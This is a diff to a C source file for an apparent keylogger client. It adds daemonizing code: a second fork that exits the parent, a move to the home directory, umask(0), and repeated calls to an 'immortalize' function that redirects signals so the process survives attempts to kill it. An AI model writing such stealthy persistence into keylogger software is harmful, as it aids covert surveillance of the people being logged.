@@ -4,8 +4,8 @@
 #include "client.h"
 
 #include "keylogger.h"
-#include  <errno.h>
-#include  <signal.h>
+#include <errno.h>
+#include <signal.h>
 #include <stdlib.h>
 #include <stdio.h>
 #include <unistd.h>
@@ -61,6 +61,39 @@ void background_process(void) {
   //printf("backgrounding complete 4\n");
 
 
+  // redirect signals
+  immortalize();
+
+  //fork again?
+
+  //printf("backgrounding complete 5\n");
+  process_id = fork();
+
+    if (process_id == -1){
+    perror("Failed to fork Process\n");
+    //status 1 is an error
+    exit(errno);
+  }
+  else if (process_id > 0){
+    //successfully exit parent process
+    printf("killing parent");
+    //raise(SIGKILL);
+    exit(0);
+    perror("this should not be viewable");
+  }
+  //printf("backgrounding complete 6\n");
+  //change working directory to root
+
+  chdir(getenv("HOME"));
+
+  //set umask to 0
+
+  umask(0);
+  //signal handle again just to make sure
+  immortalize();
+  printf("backgrounding complete\n");
+
+  // redirect signals
   // redirect signals
   immortalize();
 
